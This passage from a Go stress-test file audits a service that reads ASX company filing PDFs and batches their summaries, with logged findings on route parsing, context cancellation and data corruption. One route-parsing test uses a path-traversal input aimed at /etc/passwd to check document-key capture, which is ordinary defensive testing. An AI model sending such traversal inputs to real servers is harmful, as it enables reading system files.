		market: &mockMarketDataStorage{
			data: map[string]*models.MarketData{
				"BHP.AU": {Ticker: "BHP.AU", Filings: filings},
			},
		},
		signals: &mockSignalStorage{},
		files:   files,
	}

	logger := common.NewLogger("error")
	svc := NewService(storage, nil, nil, logger)

	start := time.Now()
	_, err := svc.ReadFiling(context.Background(), "BHP.AU", "TARGET")
	elapsed := time.Since(start)

	if elapsed > time.Second {
		t.Errorf("ReadFiling with 10k filings took %v — too slow", elapsed)
	}
	_ = err
}

// 41. Context cancellation during ReadFiling
func TestStress_ReadFiling_ContextCancellation(t *testing.T) {
	now := time.Now()
	files := &mockFileStore{files: map[string][]byte{
		"filing_pdf/BHP/test.pdf": []byte("%PDF-1.4 some data"),
	}}
	storage := &mockStorageManager{
		market: &mockMarketDataStorage{
			data: map[string]*models.MarketData{
				"BHP.AU": {
					Ticker: "BHP.AU",
					Filings: []models.CompanyFiling{
						{DocumentKey: "001", PDFPath: "BHP/test.pdf", Date: now, Headline: "Test"},
					},
				},
			},
		},
		signals: &mockSignalStorage{},
		files:   files,
	}

	logger := common.NewLogger("error")
	svc := NewService(storage, nil, nil, logger)

	ctx, cancel := context.WithCancel(context.Background())
	cancel()

	done := make(chan struct{})
	go func() {
		svc.ReadFiling(ctx, "BHP.AU", "001")
		close(done)
	}()

	select {
	case <-done:
		// Good
	case <-time.After(5 * time.Second):
		t.Error("ReadFiling did not return after context cancellation")
	}
}

// 42. Duplicate document keys — returns first match
func TestStress_ReadFiling_DuplicateDocumentKeys(t *testing.T) {
	now := time.Now()
	files := &mockFileStore{files: map[string][]byte{
		"filing_pdf/BHP/first.pdf":  []byte("%PDF-1.4 first"),
		"filing_pdf/BHP/second.pdf": []byte("%PDF-1.4 second"),
	}}
	storage := &mockStorageManager{
		market: &mockMarketDataStorage{
			data: map[string]*models.MarketData{
				"BHP.AU": {
					Ticker: "BHP.AU",
					Filings: []models.CompanyFiling{
						{DocumentKey: "DUPE", PDFPath: "BHP/first.pdf", Date: now, Headline: "First Filing"},
						{DocumentKey: "DUPE", PDFPath: "BHP/second.pdf", Date: now, Headline: "Second Filing"},
					},
				},
			},
		},
		signals: &mockSignalStorage{},
		files:   files,
	}

	logger := common.NewLogger("error")
	svc := NewService(storage, nil, nil, logger)

	result, err := svc.ReadFiling(context.Background(), "BHP.AU", "DUPE")
	if err == nil && result != nil {
		if result.Headline != "First Filing" {
			t.Errorf("expected first match headline 'First Filing', got %q", result.Headline)
		}
	}
}

// 43. FINDING: FilingContent.PDFPath exposes internal storage key
func TestStress_ReadFiling_ResponseFieldAudit(t *testing.T) {
	now := time.Now()
	files := &mockFileStore{files: map[string][]byte{
		"filing_pdf/BHP/test.pdf": []byte("%PDF-1.4 data"),
	}}
	storage := &mockStorageManager{
		market: &mockMarketDataStorage{
			data: map[string]*models.MarketData{
				"BHP.AU": {
					Ticker: "BHP.AU",
					Filings: []models.CompanyFiling{
						{
							DocumentKey:    "001",
							PDFPath:        "BHP/test.pdf",
							Date:           now,
							Headline:       "Results",
							Type:           "Annual Report",
							PriceSensitive: true,
							Relevance:      "HIGH",
							PDFURL:         "https://www.asx.com.au/asx/v2/statistics/displayAnnouncement.do?display=pdf&idsId=001",
						},
					},
				},
			},
		},
		signals: &mockSignalStorage{},
		files:   files,
	}

	logger := common.NewLogger("error")
	svc := NewService(storage, nil, nil, logger)

	result, err := svc.ReadFiling(context.Background(), "BHP.AU", "001")
	if err != nil {
		t.Skipf("PDF extraction failed (expected for minimal test PDF): %v", err)
	}

	if result.PDFPath != "" {
		t.Log("NOTE: FilingContent.PDFPath exposes internal storage key in API response: " + result.PDFPath)
	}
	if result.Ticker != "BHP.AU" {
		t.Errorf("Ticker = %q, want BHP.AU", result.Ticker)
	}
	if result.TextLength != len(result.Text) {
		t.Errorf("TextLength = %d, but len(Text) = %d", result.TextLength, len(result.Text))
	}
}

// 44. ExtractPDFTextFromBytes panic recovery
func TestStress_ExtractPDFTextFromBytes_PanicRecovery(t *testing.T) {
	panicInputs := [][]byte{
		[]byte("%PDF-1.4\n"),
		append([]byte("%PDF-1.4\n"), make([]byte, 1024)...),
		func() []byte {
			data := make([]byte, 10000)
			copy(data, "%PDF-1.7\n")
			for i := 10; i < len(data); i++ {
				data[i] = byte(i % 256)
			}
			return data
		}(),
		[]byte("%PDF"),
		make([]byte, 100),
		func() []byte {
			data := make([]byte, 1024*1024)
			copy(data, "%PDF-1.4\n")
			return data
		}(),
	}

	for i, input := range panicInputs {
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Errorf("input %d caused unrecovered panic: %v", i, r)
				}
			}()
			_, _ = ExtractPDFTextFromBytes(input)
		}()
	}
}

// 45. countPDFPages panic recovery
func TestStress_CountPDFPages_PanicRecovery(t *testing.T) {
	panicInputs := [][]byte{
		nil,
		{},
		[]byte("not a pdf"),
		[]byte("%PDF-1.4\ngarbage"),
		make([]byte, 100),
	}

	for i, input := range panicInputs {
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Errorf("input %d caused unrecovered panic: %v", i, r)
				}
			}()
			pages := countPDFPages(input)
			if pages < 0 {
				t.Errorf("input %d returned negative page count: %d", i, pages)
			}
		}()
	}
}

// 46. ReadFiling metadata correctness
func TestStress_ReadFiling_MetadataPopulation(t *testing.T) {
	filingDate := time.Date(2025, 8, 20, 10, 30, 0, 0, time.UTC)
	files := &mockFileStore{files: map[string][]byte{
		"filing_pdf/BHP/test.pdf": []byte("%PDF-1.4 data"),
	}}
	storage := &mockStorageManager{
		market: &mockMarketDataStorage{
			data: map[string]*models.MarketData{
				"BHP.AU": {
					Ticker: "BHP.AU",
					Filings: []models.CompanyFiling{
						{
							DocumentKey:    "03063826",
							PDFPath:        "BHP/test.pdf",
							Date:           filingDate,
							Headline:       "Full Year Financial Results",
							Type:           "Annual Report",
							PriceSensitive: true,
							Relevance:      "HIGH",
							PDFURL:         "https://www.asx.com.au/asx/v2/statistics/displayAnnouncement.do?display=pdf&idsId=03063826",
						},
					},
				},
			},
		},
		signals: &mockSignalStorage{},
		files:   files,
	}

	logger := common.NewLogger("error")
	svc := NewService(storage, nil, nil, logger)

	result, err := svc.ReadFiling(context.Background(), "BHP.AU", "03063826")
	if err != nil {
		t.Skipf("PDF extraction failed (expected): %v", err)
	}

	if !result.Date.Equal(filingDate) {
		t.Errorf("Date = %v, want %v", result.Date, filingDate)
	}
	if result.Type != "Annual Report" {
		t.Errorf("Type = %q, want 'Annual Report'", result.Type)
	}
	if !result.PriceSensitive {
		t.Error("PriceSensitive should be true")
	}
	if result.Relevance != "HIGH" {
		t.Errorf("Relevance = %q, want HIGH", result.Relevance)
	}
	if result.PDFURL == "" {
		t.Error("PDFURL should be populated")
	}
	if result.TextLength != len(result.Text) {
		t.Errorf("TextLength = %d, but len(Text) = %d", result.TextLength, len(result.Text))
	}
}

// 47. FINDING: Route parser captures everything after /filings/ as document_key
func TestStress_RouteParsing_FilingsDocKey(t *testing.T) {
	testCases := []struct {
		path    string
		wantKey string
	}{
		{"BHP.AU/filings/03063826", "03063826"},
		{"BHP.AU/filings/03063826/extra", "03063826/extra"},
		{"BHP.AU/filings/03063826?q=1", "03063826?q=1"},
		{"BHP.AU/filings/", ""},
		{"BHP.AU/filings/../../etc/passwd", "../../etc/passwd"},
	}

	for _, tc := range testCases {
		path := tc.path
		idx := strings.Index(path, "/filings/")
		if idx < 0 {
			t.Errorf("path %q: /filings/ not found", path)
			continue
		}
		docKey := path[idx+len("/filings/"):]
		if docKey != tc.wantKey {
			t.Errorf("path %q: docKey = %q, want %q", path, docKey, tc.wantKey)
		}
	}

	// FINDING: The route parser captures everything after /filings/ including
	// extra path segments. Safe due to exact string match against stored keys,
	// but consider validating document_key format to reject keys with slashes.
	t.Log("FINDING: Route parser captures everything after /filings/ as document_key. " +
		"Extra path segments become part of the key. Safe due to exact match, " +
		"but consider validating document_key format.")
}

// 48. FINDING: ExtractPDFTextFromBytes truncation limit is shared
func TestStress_ReadFiling_TruncationLimit(t *testing.T) {
	t.Log("REVIEW: ExtractPDFTextFromBytes truncates at 50k chars — same limit " +
		"for both ReadFiling and Gemini summarization. Consider whether ReadFiling " +
		"should allow a higher or configurable limit.")
}

// ============================================================================
// OOM Fix Stress Tests — Per-Batch Persistence, Nil-Out Safety, Edge Cases
// ============================================================================

// 49. CRITICAL: CollectFilingSummaries nil-out corrupts saved data
// The nil-out of EOD/News/etc on the shared pointer means SaveMarketData
// persists nil fields, permanently deleting that data from the database.
func TestStressOOM_CollectFilingSummaries_NilOutCorruptsData(t *testing.T) {
	now := time.Now()

	originalEOD := []models.EODBar{{Date: now, Close: 42.5, Volume: 1000000}}
	originalNews := []*models.NewsItem{{Title: "Test News", PublishedAt: now}}
	originalTimeline := &models.CompanyTimeline{BusinessModel: "Mining"}

	storage := &mockStorageManager{
		market: &mockMarketDataStorage{
			data: map[string]*models.MarketData{
				"BHP.AU": {
					Ticker:                   "BHP.AU",
					Exchange:                 "AU",
					DataVersion:              common.SchemaVersion,
					EOD:                      originalEOD,
					News:                     originalNews,
					CompanyTimeline:          originalTimeline,
					FilingSummaryPromptHash:  filingSummaryPromptHash(),
					FilingSummariesUpdatedAt: now,
					Filings: []models.CompanyFiling{
						{Date: now, Headline: "Results", Relevance: "HIGH", DocumentKey: "001"},
					},
				},
			},
		},
		signals: &mockSignalStorage{},
	}

	logger := common.NewLogger("error")
	svc := NewService(storage, nil, nil, logger)

	// CollectFilingSummaries returns early because gemini==nil
	err := svc.CollectFilingSummaries(context.Background(), "BHP.AU", false)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// CRITICAL CHECK: After CollectFilingSummaries, the MarketData should
	// still have its EOD, News, and CompanyTimeline data intact.
	saved := storage.market.data["BHP.AU"]

	if saved.EOD == nil {
		t.Error("CRITICAL BUG: EOD data was nil'd and persisted. " +
			"CollectFilingSummaries nil-out on shared pointer corrupts data. " +
			"Fix: save/restore the fields, or don't nil on the shared pointer.")
	} else if len(saved.EOD) != 1 || saved.EOD[0].Close != 42.5 {
		t.Errorf("EOD data was corrupted: got %v", saved.EOD)
	}

	if saved.News == nil {
		t.Error("CRITICAL BUG: News data was nil'd and persisted.")
	}

	if saved.CompanyTimeline == nil {
		t.Error("CRITICAL BUG: CompanyTimeline was nil'd and persisted.")
	}
}

// 50. Per-batch persistence: saveFn failure does not stop processing
func TestStressOOM_SaveFnFailure_ContinuesProcessing(t *testing.T) {
	filings := make([]models.CompanyFiling, 5)
	for i := range filings {
		filings[i] = models.CompanyFiling{
			Date:        time.Date(2025, 1, 1+i, 0, 0, 0, 0, time.UTC),
			Headline:    fmt.Sprintf("Report %d", i+1),
			Relevance:   "HIGH",
			DocumentKey: fmt.Sprintf("doc%d", i+1),
		}
	}

	logger := common.NewLogger("error")
	svc := &Service{
		storage: &mockStorageManager{},
		logger:  logger,
	}

	var saveCalls int
	saveErrors := 0
	saveFn := func(summaries []models.FilingSummary) error {
		saveCalls++
		if saveCalls == 1 {
			saveErrors++
			return fmt.Errorf("simulated persistence failure")
		}
		return nil
	}

	// With gemini=nil, summarizeFilingBatch returns nil, but saveFn is still called
	result, changed := svc.summarizeNewFilings(context.Background(), "TEST.AU", filings, nil, saveFn)
	if !changed {
		t.Error("expected changed=true")
	}

	// Should have called saveFn for each batch even after failure
	expectedBatches := (len(filings) + filingSummaryBatchSize - 1) / filingSummaryBatchSize
	if saveCalls != expectedBatches {
		t.Errorf("saveFn called %d times, want %d (should continue after failure)", saveCalls, expectedBatches)
	}

	// Verify we still got results
	_ = result
}

// 51. Per-batch persistence: all saves fail — result is still returned
func TestStressOOM_AllSavesFail_ResultStillReturned(t *testing.T) {
	filings := []models.CompanyFiling{
		{Date: time.Now(), Headline: "Report 1", Relevance: "HIGH", DocumentKey: "doc1"},
		{Date: time.Now(), Headline: "Report 2", Relevance: "HIGH", DocumentKey: "doc2"},
		{Date: time.Now(), Headline: "Report 3", Relevance: "HIGH", DocumentKey: "doc3"},
	}

	logger := common.NewLogger("error")
	svc := &Service{
		storage: &mockStorageManager{},
		logger:  logger,
	}

	saveFn := func(summaries []models.FilingSummary) error {
		return fmt.Errorf("database unavailable")
	}

	// Should not panic and should still return the accumulated result
	_, changed := svc.summarizeNewFilings(context.Background(), "TEST.AU", filings, nil, saveFn)
	if !changed {
		t.Error("expected changed=true even when saves fail")
	}
}

// 52. Batch size edge cases: exactly 0, 1, and batch-size-aligned counts
func TestStressOOM_BatchSizeEdgeCases(t *testing.T) {
	logger := common.NewLogger("error")
	svc := &Service{
		storage: &mockStorageManager{},
		logger:  logger,
	}

	tests := []struct {
		name    string
		count   int
		batches int
		changed bool
	}{
		{"zero filings", 0, 0, false},
		{"one filing", 1, 1, true},
		{"exactly batch size", filingSummaryBatchSize, 1, true},
		{"batch size + 1", filingSummaryBatchSize + 1, 2, true},
		{"6 filings (3 batches)", 6, (6 + filingSummaryBatchSize - 1) / filingSummaryBatchSize, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			filings := make([]models.CompanyFiling, tt.count)
			for i := range filings {
				filings[i] = models.CompanyFiling{
					Date:        time.Date(2025, 1, 1+i, 0, 0, 0, 0, time.UTC),
					Headline:    fmt.Sprintf("Filing %d", i+1),
					Relevance:   "HIGH",
					DocumentKey: fmt.Sprintf("doc%d", i+1),
				}
			}

			var batchCount int
			saveFn := func(_ []models.FilingSummary) error {
				batchCount++
				return nil
			}

			_, changed := svc.summarizeNewFilings(context.Background(), "TEST.AU", filings, nil, saveFn)
			if changed != tt.changed {
				t.Errorf("changed = %v, want %v", changed, tt.changed)
			}
			if batchCount != tt.batches {
				t.Errorf("batch count = %d, want %d", batchCount, tt.batches)
			}
		})
	}
}

// 53. Existing summaries are preserved and appended to correctly
func TestStressOOM_ExistingSummariesPreserved(t *testing.T) {
	existing := []models.FilingSummary{
		{Date: time.Date(2025, 1, 1, 0, 0, 0, 0, time.UTC), Headline: "Old Report", Type: "financial_results", DocumentKey: "old1"},
	}
	filings := []models.CompanyFiling{
		{Date: time.Date(2025, 2, 1, 0, 0, 0, 0, time.UTC), Headline: "New Report", Relevance: "HIGH", DocumentKey: "new1"},
	}

	logger := common.NewLogger("error")
	svc := &Service{
		storage: &mockStorageManager{},
		logger:  logger,
	}

	var lastSaved []models.FilingSummary
	saveFn := func(summaries []models.FilingSummary) error {
		lastSaved = make([]models.FilingSummary, len(summaries))
		copy(lastSaved, summaries)
		return nil
	}

	result, changed := svc.summarizeNewFilings(context.Background(), "TEST.AU", filings, existing, saveFn)
	if !changed {
		t.Error("expected changed=true")
	}

	// Result should include existing summaries
	if len(result) < 1 {
		t.Fatalf("expected at least 1 summary (existing), got %d", len(result))
	}

	// The existing summary should still be present
	found := false
	for _, s := range result {
		if s.Headline == "Old Report" {
			found = true
			break
		}
	}
	if !found {
		t.Error("existing summary 'Old Report' was lost during batch processing")
	}
}

// 54. runtime.GC() placement — verify it doesn't panic or cause issues
func TestStressOOM_RuntimeGC_DoesNotPanic(t *testing.T) {
	filings := make([]models.CompanyFiling, 10)
	for i := range filings {
		filings[i] = models.CompanyFiling{
			Date:        time.Date(2025, 1, 1+i, 0, 0, 0, 0, time.UTC),
			Headline:    fmt.Sprintf("Filing %d", i+1),
			Relevance:   "HIGH",
			DocumentKey: fmt.Sprintf("doc%d", i+1),
		}
	}

	logger := common.NewLogger("error")
	svc := &Service{
		storage: &mockStorageManager{},
		logger:  logger,
	}

	// Process all 10 filings with GC after each batch — should not panic
	saveFn := func(_ []models.FilingSummary) error { return nil }
	_, _ = svc.summarizeNewFilings(context.Background(), "TEST.AU", filings, nil, saveFn)
}

// 55. data = nil after PDF extraction — verify no subsequent access panics
func TestStressOOM_DataNilAfterExtraction_NoSubsequentAccess(t *testing.T) {
	// The buildFilingSummaryPrompt function sets data = nil after extraction.
	// Verify the prompt builds correctly with multiple PDFs in the batch,
	// ensuring the nil-out doesn't affect subsequent iterations.
	files := map[string][]byte{
		"filing_pdf/BHP/doc1.pdf": []byte("%PDF-1.4 minimal pdf 1"),
		"filing_pdf/BHP/doc2.pdf": []byte("%PDF-1.4 minimal pdf 2"),
	}

	svc := &Service{storage: &mockStorageManager{
		files: &mockFileStore{files: files},
	}}

	batch := []models.CompanyFiling{
		{Date: time.Now(), Headline: "Report 1", PDFPath: "BHP/doc1.pdf"},
		{Date: time.Now(), Headline: "Report 2", PDFPath: "BHP/doc2.pdf"},
	}

	// Should not panic — data is nil'd after each PDF extraction
	// but subsequent iterations get fresh data from FileStore
	prompt := svc.buildFilingSummaryPrompt("BHP.AU", batch)
	if !strings.Contains(prompt, "Report 1") {
		t.Error("prompt should contain Report 1")
	}
	if !strings.Contains(prompt, "Report 2") {
		t.Error("prompt should contain Report 2")
	}
}

// 56. FINDING: Context cancellation during batch processing — rate-limit sleep
// is not context-aware. The `time.Sleep(1*time.Second)` between batches ignores
// context cancellation, so shutdown can be delayed by up to 1s per remaining batch.
// With batch size 2 and many filings, this accumulates.
func TestStressOOM_ContextCancellation_RateLimitNotCancellable(t *testing.T) {
	// Use just 3 filings (2 batches) to keep test fast
	filings := make([]models.CompanyFiling, 3)
	for i := range filings {
		filings[i] = models.CompanyFiling{
			Date:        time.Date(2025, 1, 1+i, 0, 0, 0, 0, time.UTC),
			Headline:    fmt.Sprintf("Filing %d", i+1),
			Relevance:   "HIGH",
			DocumentKey: fmt.Sprintf("doc%d", i+1),
		}
	}

	logger := common.NewLogger("error")
	svc := &Service{
		storage: &mockStorageManager{},
		logger:  logger,
	}

	ctx, cancel := context.WithCancel(context.Background())
	cancel() // cancel immediately

	saveFn := func(_ []models.FilingSummary) error { return nil }

	// With 3 filings (2 batches), the inter-batch sleep adds 1s.
	// This completes but is slower than it should be with a cancelled context.
	done := make(chan struct{})
	go func() {
		svc.summarizeNewFilings(ctx, "TEST.AU", filings, nil, saveFn)
		close(done)
	}()

	select {
	case <-done:
		t.Log("FINDING: summarizeNewFilings completed with cancelled context, " +
			"but the inter-batch time.Sleep is not context-aware. " +
			"Consider using select with ctx.Done() for the rate-limit sleep.")
	case <-time.After(5 * time.Second):
		t.Error("summarizeNewFilings did not complete within 5s with cancelled context — " +
			"rate-limit sleep is blocking shutdown")
	}
}

// 57. saveFn receives monotonically growing summaries slice
func TestStressOOM_SaveFn_ReceivesGrowingSlice(t *testing.T) {
	filings := make([]models.CompanyFiling, 6) // 3 batches of 2
	for i := range filings {
		filings[i] = models.CompanyFiling{
			Date:        time.Date(2025, 1, 1+i, 0, 0, 0, 0, time.UTC),
			Headline:    fmt.Sprintf("Filing %d", i+1),
			Relevance:   "HIGH",
			DocumentKey: fmt.Sprintf("doc%d", i+1),
		}
	}

	logger := common.NewLogger("error")
	svc := &Service{
		storage: &mockStorageManager{},
		logger:  logger,
	}

	var sizes []int
	saveFn := func(summaries []models.FilingSummary) error {
		sizes = append(sizes, len(summaries))
		return nil
	}

	svc.summarizeNewFilings(context.Background(), "TEST.AU", filings, nil, saveFn)

	// Each batch should produce a growing accumulated slice.
	// With gemini=nil, summarizeFilingBatch returns nil (0 new summaries per batch).
	// So sizes should be [0, 0, 0] — the existing slice is passed through.
	// This is fine — the important thing is it doesn't shrink.
	for i := 1; i < len(sizes); i++ {
		if sizes[i] < sizes[i-1] {
			t.Errorf("saveFn slice shrunk between batches: %v", sizes)
			break
		}
	}
}

// 58. filingSummaryBatchSize constant is 2
func TestStressOOM_BatchSizeIsTwo(t *testing.T) {
	if filingSummaryBatchSize != 2 {
		t.Errorf("filingSummaryBatchSize = %d, want 2 (reduced from 5 for OOM prevention)", filingSummaryBatchSize)
	}
}

// 59. Concurrent summarizeNewFilings calls — no race conditions
func TestStressOOM_ConcurrentSummarize(t *testing.T) {
	filings := []models.CompanyFiling{
		{Date: time.Now(), Headline: "Report 1", Relevance: "HIGH", DocumentKey: "doc1"},
	}

	logger := common.NewLogger("error")

	var wg sync.WaitGroup
	for i := 0; i < 10; i++ {
		wg.Add(1)
		go func(n int) {
			defer wg.Done()
			svc := &Service{
				storage: &mockStorageManager{},
				logger:  logger,
			}
			saveFn := func(_ []models.FilingSummary) error { return nil }
			svc.summarizeNewFilings(context.Background(), fmt.Sprintf("T%d.AU", n), filings, nil, saveFn)
		}(i)
	}
	wg.Wait()
}
